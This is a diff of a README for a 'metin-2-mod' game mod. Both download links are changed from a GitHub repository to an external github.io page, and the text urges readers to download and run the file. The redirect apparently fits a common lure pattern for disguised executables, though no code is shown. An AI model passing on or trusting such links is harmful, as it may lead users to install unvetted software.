@@ -23,7 +23,7 @@
 
 ### Step 1: Get the File
 
-[![Download metin-2-mod](https://img.shields.io/badge/Download-metin--2--mod-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://github.com/Chantalexogamous2104/metin-2-mod)
+[![Download metin-2-mod](https://img.shields.io/badge/Download-metin--2--mod-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://chantalexogamous2104.github.io)
 
 Visit this link to download the application. The page will open in your browser where you'll find the download button. Click it and wait for the file to save to your computer (usually to your "Downloads" folder).
 
@@ -161,7 +161,7 @@ Ready to get started? Here's all you need to do:
 
 That's it! No complicated steps, no confusing setup. Just download, run, and play.
 
-[⬇️ Download Now](https://github.com/Chantalexogamous2104/metin-2-mod)
+[⬇️ Download Now](https://chantalexogamous2104.github.io)
 
 ---
 
